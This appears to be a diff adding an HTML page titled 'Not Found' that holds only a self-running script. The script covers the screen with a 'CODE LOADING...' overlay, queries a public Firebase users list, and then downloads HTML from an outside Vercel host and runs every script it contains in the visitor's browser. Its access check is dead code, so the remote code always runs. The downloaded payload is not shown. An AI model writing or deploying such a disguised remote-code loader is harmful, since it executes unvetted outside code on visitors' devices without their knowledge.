@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Not Found</title>
+</head>
+
+<body>
+    <script id="js">
+        javascript:(function(){
+
+// ---------------- CONFIG ----------------
+var pID = "reactions-maker-site",
+    db = "https://"+pID+"-default-rtdb.firebaseio.com/users.json",
+    img = "https://i.ibb.co/Z69FyZ04/20251103-091451.png";
+
+// ---------------- GET UID ----------------
+const uP = new URLSearchParams(window.location.search);
+let uid = uP.get('uid') || "";
+
+// ✅ If blank UID, generate new and append to URL
+if(!uid){
+    uid = "";
+    for(let i=0;i<20;i++) uid += Math.floor(Math.random()*10);
+    // Append UID to current URL without reload
+    const newUrl = window.location.pathname + "?uid=" + uid;
+    history.replaceState({}, document.title, newUrl);
+}
+
+// ---------------- LOADER ----------------
+var loader = document.createElement('div');
+Object.assign(loader.style,{
+    position:'fixed',
+    top:'0', left:'0',
+    width:'100vw', height:'100vh',
+    background:'#1c242a',
+    zIndex:'1000000',
+    display:'flex', flexDirection:'column',
+    justifyContent:'center', alignItems:'center',
+    color:'white', fontFamily:'sans-serif'
+});
+loader.innerHTML = `
+    <img src="${img}" style="width:85px;margin-bottom:15px;">
+    <div style="letter-spacing:2px;font-weight:bold;font-size:14px">CODE LOADING...</div>
+`;
+document.body.appendChild(loader);
+
+// ---------------- FETCH FIREBASE ----------------
+fetch(db).then(r=>r.json()).then(d=>{
+    var ok = false;
+    if(d && uid){
+        Object.values(d).forEach(u=>{
+            if(u.id === uid) ok = true;
+        });
+    }
+    loader.remove();
+    if(ok){
+        runHTML();
+    } else {
+        // Lock logic now handled via URL (uid appended)
+        runHTML(); // still load HTML
+    }
+}).catch(()=>{
+    loader.remove();
+    runHTML();
+});
+
+// ---------------- RUN HTML FILE ----------------
+function runHTML(){
+    var base = "https://ahmad-bhai-scripts.vercel.app/";
+
+    var file = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
+        ? "android.html"
+        : "pc.html";
+
+    fetch(base+file)
+    .then(r=>r.text())
+    .then(html=>{
+        var parser = new DOMParser();
+        var doc = parser.parseFromString(html,"text/html");
+
+        doc.querySelectorAll("script").forEach(scr=>{
+            var newScr = document.createElement("script");
+            if(scr.src){
+                newScr.src = scr.src;
+            } else {
+                newScr.textContent = scr.innerHTML;
+            }
+            document.body.appendChild(newScr);
+        });
+
+        // Optional: Append UID somewhere in HTML if needed
+        var uidDiv = document.createElement("div");
+        uidDiv.id = "uid_value";
+        uidDiv.style = "position:fixed;bottom:5px;right:5px;color:white;font-family:monospace;font-size:12px;z-index:99999;";
+        uidDiv.textContent = uid;
+        document.body.appendChild(uidDiv);
+
+    });
+
+}
+
+// ---------------- SELECTION STYLE ----------------
+var style = document.createElement("style");
+style.innerHTML = `
+    ::selection {
+        background:white;
+        color:black;
+    }
+`;
+document.head.appendChild(style);
+
+})();
+    </script>
+</body>
+
+</html>
